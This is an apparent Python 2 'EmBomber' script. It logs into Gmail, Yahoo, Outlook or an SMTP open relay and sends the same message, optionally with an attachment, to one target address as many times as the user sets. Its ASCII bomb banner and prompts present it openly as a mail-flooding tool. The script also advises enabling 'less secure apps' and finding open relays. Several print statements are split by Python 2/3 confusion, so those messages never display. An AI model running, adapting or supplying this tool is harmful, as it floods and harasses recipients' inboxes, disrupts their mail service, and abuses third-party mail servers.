#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def bomb():
    os.system('clear')
    print
    bcolors.OKGREEN + '''
			 \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: Mazen Elzanaty
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''' + bcolors.ENDC


os.system('clear')
try:
    file1 = open('Banner.txt', 'r')
    print(' ')
    print
    bcolors.OKGREEN + file1.read() + bcolors.ENDC
    file1.close()
except IOError:
    print('Banner File not found')

# Input
print(bcolors.WARNING + '''
Choose a Mail Service:
1) Gmail
2) Yahoo
3) Hotmail/Outlook
4) SMTP Open Relay
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
    server = raw_input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
    user = raw_input(bcolors.OKGREEN + 'Your Email: ' + bcolors.ENDC)
    pwd = getpass.getpass(bcolors.OKGREEN + 'Password: ' + bcolors.ENDC)
    to = raw_input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
    subject = raw_input(bcolors.OKGREEN + 'Subject (Optional): ' + bcolors.ENDC)
    body = raw_input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
    nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
    no = 0
# Attachments
    attach = raw_input('Add an attachment? <y/n> ')
    if attach == 'y':
        message = MIMEMultipart()
        # storing the senders email address
        message['From'] = user
        # storing the receivers email address
        message['To'] = to
        # storing the subject
        message['Subject'] = subject

        # string to store the body of the mail
        # already defined
        # body = "Body_of_the_mail"

        # attach the body with the msg instance
        message.attach(MIMEText(body, 'plain'))

        # open the file to be sent
        filename = "File_name_with_extension"
        filepath = raw_input('Please input the full path to the file: ')
        attachment = open(filepath, "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form
        p.set_payload((attachment).read())

        # encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'
        message.attach(p)
    else:
        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
    print
    bcolors.FAIL + '\nCanceled' + bcolors.ENDC
    sys.exit()

# Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
    bomb()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    try:
        server.login(user, pwd)
    except smtplib.SMTPAuthenticationError:
        print
        bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
        sys.exit()
    while no != nomes:
        try:
            server.sendmail(user, to, message)
            print
            bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
            no += 1
            time.sleep(.8)
        except KeyboardInterrupt:
            print
            bcolors.FAIL + '\nCanceled' + bcolors.ENDC
            sys.exit()
        except:
            print
            "Failed to Send "
    server.close()

# Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
    server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
    bomb()
    server.starttls()
    try:
        server.login(user, pwd)
    except smtplib.SMTPAuthenticationError:
        print
        bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		''' + bcolors.ENDC
        sys.exit()
    while no != nomes:
        try:
            server.sendmail(user, to, message)
            print
            bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
            no += 1
            time.sleep(.8)
        except KeyboardInterrupt:
            print
            bcolors.FAIL + '\nCanceled' + bcolors.ENDC
            sys.exit()
        except:
            print
            "Failed to Send"
    server.close()

# Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    bomb()
    server.ehlo()
    server.starttls()
    try:
        server.login(user, pwd)
    except smtplib.SMTPAuthenticationError:
        print
        bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
        sys.exit()
    while no != nomes:
        try:
            server.sendmail(user, to, message)
            print
            bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
            no += 1
            time.sleep(.8)
        except KeyboardInterrupt:
            print
            bcolors.FAIL + '\nCanceled' + bcolors.ENDC
            sys.exit()
        except smtplib.SMTPAuthenticationError:
            print
            '\nThe username or password you entered is incorrect.'
            sys.exit()
        except:
            print
            "Failed to Send "
    server.close()

# SMTP Open Relay
elif server == '4' or server == 'smtp' or server == 'SMTP':
    relaysrvr = raw_input('Input smtp server ip or server name; ex: mail.domain.com: ')
    srvrport = raw_input('Input smtp server port - usually 25: ')
    server = smtplib.SMTP(relaysrvr, srvrport)
    bomb()
    server.starttls()
    try:
        server.login(user, pwd)
    except smtplib.SMTPAuthenticationError:
        print
        bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
			Or you need to find another relay...
			''' + bcolors.ENDC
        sys.exit()
    while no != nomes:
        try:
            server.sendmail(user, to, message)
            print
            bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
            no += 1
            time.sleep(.8)
        except KeyboardInterrupt:
            print
            bcolors.FAIL + '\nCanceled' + bcolors.ENDC
            sys.exit()
        except:
            print
            "Failed to Send"
    server.close()

else:
    print
    'Works with Gmail, Yahoo, Outlook Hotmail, and now, SMTP Open Relay!'
    sys.exit()
